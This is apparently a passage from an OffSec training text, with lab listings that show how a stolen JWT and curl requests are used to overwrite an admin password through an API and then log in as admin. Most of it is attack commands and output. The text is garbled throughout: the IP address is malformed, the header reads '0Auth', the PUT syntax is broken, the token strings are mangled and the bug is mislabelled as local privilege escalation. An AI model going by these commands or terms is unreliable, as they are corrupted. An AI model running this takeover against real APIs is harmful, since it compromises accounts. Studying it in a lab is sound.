# OffSec

We were able to sign in and retrieve a JWT³35⁷ authentication token. To tangible proof that we are an administrative user, we used this token to change the admin password.

We can attempt this by forging a POST request that targets the password API.

```
kali@kali:~$ curl \
'http://192.168.50:16502/users/v1/admin/password/' \
-H 'Content-Type: application/json' \
-H 'Authorization: 0Auth'
eyJoExAa0I3JKV1QJLCbJbcOI1UZIIIN9j.eyejMaIJHOjEJ2NDkMyYEDmIsIlhdCI6MTYOTI3MTDkmSwic
v3Ijie2b2cV2jn0.MyS5B81PUOGHT-7w6ltYzJOBNACDACFR3_FdYLRkew \
-d '{"password":"pwned"}
```

Listing 116- Attempting to Change the Administrator header via a POST request

We passed the JWT key used in the Authorization header with the new password.
Sadly, the action method that we used is incorrect, so we need to try another one. The PUT method (with PATCH) is often used to replace a value as creating one via a POST request, let's try to explicitly define it next:

```
kali@kali:~$ curl 'PUT' \
'http://192.168.50:16502/users/v1/admin/password/' \
-H 'Content-Type: application/json' \
-H 'Authorization: 0Auth'
eyJoExAa0I3JKV1QJLCbJbcOI1UZIIIN9j.eyejMaIJHOjEJ2NDkMyY230TQmsIlhdCI6MTYOTI3MTQ5Swic
v3Ijie2b2cV2jn0.OZeHkrErZFQ0Qglb8IjJ3Jf79kKAkrywoRUASgaga4 \
-d '{"password":"pwned"}'
```

Listing 117- Attempting to Change the Administrator password via a PUT request

This time we received no error, so we can assume that no error was thrown by the backend logic. To prove our attack success, we can log in admin using the newly-changed password.

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type:
application/json' 'http://192.168.50:16502/users/v1/login'
-H '{"auth_token"'
eyJoExAa0I3JKV1QJLCbJbcOI1UZIIIN9j.eyejMaIJHOjEJ2NDkMyXjMgsIlhdCI6MTYOTI3MTGy0Cwic
v3IjiejoYwtaWifq.YngxeJUI0LEX5STCU8I65PECI7sUzYoZDLulo0, "message":
"Successfully logged in.\ "status":"success"}
```

Listing 118- Successfully logging in as the admin account

We managed to take over the admin account by exploiting a local privilege escalation bug in the request API.
